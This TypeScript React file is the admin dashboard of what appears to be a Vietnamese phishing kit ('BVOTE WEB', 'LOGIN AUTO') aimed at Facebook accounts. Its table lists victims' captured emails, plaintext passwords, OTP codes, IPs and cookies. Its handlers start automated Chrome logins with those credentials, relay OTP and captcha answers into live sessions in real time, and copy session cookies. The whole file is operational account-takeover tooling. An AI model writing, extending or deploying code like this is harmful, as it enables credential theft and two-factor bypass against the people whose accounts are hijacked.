import React, { useState, useEffect } from 'react';
import { useAuth } from '../../../contexts/AuthContext';
import {
  DashboardContainer,
  Sidebar,
  SidebarHeader,
  StatsCard,
  StatsTitle,
  StatsItem,
  StatsValue,
  MenuList,
  MenuItem,
  MenuLink,
  MainContent,
  PageHeader,
  PageTitle,
  SubTitle,
  AccessLogTable,
  TableHeader,
  TableRow,
  StatusBadge,
  ActionButton,
  SearchBar,
  SearchInput,
  QuickActions,
  CopyButton,
  Pagination,
  PageButton,
  OnlineCount,
} from '../../../styles/dashboard';
import {
  FaUser,
  FaBell,
  FaCog,
  FaSignOutAlt,
  FaLink,
  FaNetworkWired,
  FaRobot,
  FaPowerOff,
  FaChrome,
  FaCopy,
  FaUsers,
  FaTrash,
  FaFilter,
  FaSearch,
} from 'react-icons/fa';
import { useWebSocket } from '../../../hooks/useWebSocket';
import { autoLoginService } from '../services/autoLoginService';
import { toast } from 'react-toastify';

interface AccessLog {
  id: number;
  timestamp: string;
  link: string;
  email: string;
  password: string;
  otp: string;
  ip: string;
  status: 'success' | 'pending' | 'code_required' | 'captcha' | 'wrong_password' | 'wrong_account' | 'wrong_phone';
  result: string;
  cookies: string;
  chromeLink: string;
  sessionId: string;
}

const Dashboard: React.FC = () => {
  const { user, logout } = useAuth();
  const [searchTerm, setSearchTerm] = useState('');
  const [accessLogs, setAccessLogs] = useState<AccessLog[]>([]);
  const [stats, setStats] = useState({
    approved: 0,
    codeVerified: 0,
    captchaError: 0,
    wrongPassword: 0,
    success: 0,
  });
  const [onlineCount, setOnlineCount] = useState(0);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [selectedChrome, setSelectedChrome] = useState<string>('');

  // WebSocket connection for real-time updates
  const { lastMessage, sendMessage } = useWebSocket('ws://localhost:3000/ws');

  useEffect(() => {
    if (lastMessage) {
      const data = JSON.parse(lastMessage.data);
      switch (data.type) {
        case 'stats':
          setStats(data.stats);
          break;
        case 'accessLog':
          setAccessLogs(prev => [data.log, ...prev]);
          break;
        case 'onlineCount':
          setOnlineCount(data.count);
          break;
        default:
          break;
      }
    }
  }, [lastMessage]);

  const handleCopy = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success(`${type} copied to clipboard!`);
    } catch (error) {
      toast.error('Failed to copy to clipboard');
    }
  };

  const getStatusBadgeColor = (status: string) => {
    switch (status) {
      case 'success':
        return '#4CAF50'; // Xanh lá
      case 'pending':
      case 'code_required':
        return '#FFC107'; // Vàng
      case 'captcha':
        return '#FF9800'; // Cam
      case 'wrong_password':
      case 'wrong_account':
      case 'wrong_phone':
        return '#F44336'; // Đỏ
      default:
        return '#9E9E9E'; // Xám
    }
  };

  const getStatusText = (status: string) => {
    switch (status) {
      case 'success':
        return '✅ Thành Công';
      case 'pending':
        return '🟡 Phê Duyệt';
      case 'code_required':
        return '🟡 Nhận Code';
      case 'captcha':
        return '🟠 Captcha';
      case 'wrong_password':
        return '❌ Sai mật khẩu';
      case 'wrong_account':
        return '❌ Sai Tài Khoản';
      case 'wrong_phone':
        return '❌ Sai Số Phone';
      default:
        return status;
    }
  };

  const handleAutoLogin = async () => {
    if (!searchTerm) {
      toast.warning('Vui lòng nhập link Facebook');
      return;
    }

    setIsLoading(true);
    try {
      const response = await autoLoginService.startAutoLogin({
        link: searchTerm,
        chromePath: selectedChrome,
      });

      if (response.success && response.data) {
        toast.success('Bắt đầu quá trình đăng nhập tự động');
        sendMessage(JSON.stringify({
          type: 'subscribe',
          channel: 'autoLogin',
          sessionId: response.data.sessionId
        }));

        // Thêm log mới vào danh sách
        setAccessLogs(prev => [{
          id: Date.now(),
          timestamp: new Date().toISOString(),
          link: searchTerm,
          email: '',
          password: '',
          otp: '',
          ip: '',
          status: 'pending',
          result: 'Đang xử lý...',
          cookies: '',
          chromeLink: response.data.chromeLink || '',
          sessionId: response.data.sessionId
        }, ...prev]);
      } else {
        toast.error(response.message || 'Không thể bắt đầu quá trình đăng nhập');
      }
    } catch (error) {
      toast.error('Lỗi khi bắt đầu đăng nhập tự động');
    } finally {
      setIsLoading(false);
    }
  };

  const handleSubmitOTP = async (sessionId: string, otp: string) => {
    try {
      const response = await autoLoginService.submitOTP(sessionId, otp);
      if (response.success) {
        toast.success('Đã gửi mã OTP');
      } else {
        toast.error(response.message || 'Không thể gửi mã OTP');
      }
    } catch (error) {
      toast.error('Lỗi khi gửi mã OTP');
    }
  };

  const handleSubmitCaptcha = async (sessionId: string, captchaSolution: string) => {
    try {
      const response = await autoLoginService.submitCaptcha(sessionId, captchaSolution);
      if (response.success) {
        toast.success('Đã gửi giải pháp captcha');
      } else {
        toast.error(response.message || 'Không thể gửi giải pháp captcha');
      }
    } catch (error) {
      toast.error('Lỗi khi gửi giải pháp captcha');
    }
  };

  const handleStopAutoLogin = async (sessionId: string) => {
    try {
      const response = await autoLoginService.stopAutoLogin(sessionId);
      if (response.success) {
        toast.success('Auto login process stopped');
      } else {
        toast.error(response.message);
      }
    } catch (error) {
      toast.error('Failed to stop auto login process');
    }
  };

  const handlePageChange = (page: number) => {
    setCurrentPage(page);
    // Fetch logs for the new page
  };

  const handleChromeSelect = (chromePath: string) => {
    setSelectedChrome(chromePath);
    toast.info(`Selected Chrome: ${chromePath}`);
  };

  return (
    <DashboardContainer>
      <Sidebar>
        <SidebarHeader>
          {user ? `Welcome, ${user.username}` : 'BVOTE WEB'}
        </SidebarHeader>

        <StatsCard>
          <StatsTitle>Kết Quả 24h</StatsTitle>
          <StatsItem>
            <span>Phê Duyệt</span>
            <StatsValue>{stats.approved}</StatsValue>
          </StatsItem>
          <StatsItem>
            <span>Duyệt Code</span>
            <StatsValue>{stats.codeVerified}</StatsValue>
          </StatsItem>
          <StatsItem>
            <span>Lỗi Captcha</span>
            <StatsValue>{stats.captchaError}</StatsValue>
          </StatsItem>
          <StatsItem>
            <span>Sai Mật Khẩu</span>
            <StatsValue>{stats.wrongPassword}</StatsValue>
          </StatsItem>
          <StatsItem>
            <span>Thành Công</span>
            <StatsValue>{stats.success}</StatsValue>
          </StatsItem>
        </StatsCard>

        <MenuList>
          <MenuItem>
            <MenuLink href="#" onClick={handleAutoLogin}>
              <FaRobot /> Login AUTO
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#">
              <FaPowerOff /> Login OFF
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#">
              <FaBell /> Thông Báo
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#">
              <FaNetworkWired /> Quản Lý IP
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#">
              <FaLink /> Quản Lý Link
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#">
              <FaCog /> Cài Đặt Web
            </MenuLink>
          </MenuItem>
          <MenuItem>
            <MenuLink href="#" onClick={logout}>
              <FaSignOutAlt /> Đăng Xuất
            </MenuLink>
          </MenuItem>
        </MenuList>
      </Sidebar>

      <MainContent>
        <OnlineCount>
          <FaUsers /> {onlineCount} Online
        </OnlineCount>

        <PageHeader>
          <PageTitle>Bảng Điều Khiển LOGIN AUTO</PageTitle>
        </PageHeader>

        <SubTitle>Danh Sách Lịch Sử Truy Cập</SubTitle>

        <QuickActions>
          <ActionButton onClick={handleAutoLogin} disabled={isLoading}>
            <FaRobot /> Auto Login
          </ActionButton>
          <ActionButton onClick={() => handleChromeSelect('default')}>
            <FaChrome /> Chrome Mặc Định
          </ActionButton>
          <ActionButton onClick={() => handleChromeSelect('custom')}>
            <FaChrome /> Chrome Tùy Chỉnh
          </ActionButton>
        </QuickActions>

        <SearchBar>
          <SearchInput
            type="text"
            placeholder="Nhập link Facebook..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <ActionButton>
            <FaSearch /> Tìm Kiếm
          </ActionButton>
          <ActionButton>
            <FaFilter /> Lọc
          </ActionButton>
        </SearchBar>

        <AccessLogTable>
          <TableHeader>
            <div>STT</div>
            <div>Thời Gian</div>
            <div>Tên Link</div>
            <div>Email</div>
            <div>Mật Khẩu</div>
            <div>Code OTP</div>
            <div>IP Login</div>
            <div>Trạng Thái</div>
            <div>Kết Quả</div>
            <div>Thao Tác</div>
          </TableHeader>

          {accessLogs.map((log, index) => (
            <TableRow key={log.id}>
              <div>{index + 1}</div>
              <div>{new Date(log.timestamp).toLocaleString()}</div>
              <div>{log.link}</div>
              <div>{log.email}</div>
              <div>{log.password}</div>
              <div>
                {log.status === 'code_required' ? (
                  <input
                    type="text"
                    placeholder="Nhập OTP"
                    onChange={(e) => handleSubmitOTP(log.sessionId, e.target.value)}
                  />
                ) : (
                  log.otp
                )}
              </div>
              <div>
                {log.ip}
                <CopyButton onClick={() => handleCopy(log.ip, 'IP')}>
                  <FaCopy />
                </CopyButton>
              </div>
              <div>
                <StatusBadge status={log.status} style={{ backgroundColor: getStatusBadgeColor(log.status) }}>
                  {getStatusText(log.status)}
                </StatusBadge>
              </div>
              <div>
                <StatusBadge status={log.result} style={{ backgroundColor: getStatusBadgeColor(log.result) }}>
                  {log.result}
                </StatusBadge>
              </div>
              <div>
                {log.cookies && (
                  <CopyButton onClick={() => handleCopy(log.cookies, 'Cookies')}>
                    <FaCopy />
                  </CopyButton>
                )}
                {log.chromeLink && (
                  <CopyButton onClick={() => window.open(log.chromeLink)}>
                    <FaChrome />
                  </CopyButton>
                )}
                <CopyButton onClick={() => handleStopAutoLogin(log.sessionId)}>
                  <FaTrash />
                </CopyButton>
              </div>
            </TableRow>
          ))}
        </AccessLogTable>

        <Pagination>
          <PageButton
            onClick={() => handlePageChange(currentPage - 1)}
            disabled={currentPage === 1}
          >
            Previous
          </PageButton>
          {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
            <PageButton
              key={page}
              active={page === currentPage}
              onClick={() => handlePageChange(page)}
            >
              {page}
            </PageButton>
          ))}
          <PageButton
            onClick={() => handlePageChange(currentPage + 1)}
            disabled={currentPage === totalPages}
          >
            Next
          </PageButton>
        </Pagination>
      </MainContent>
    </DashboardContainer>
  );
};

export default Dashboard;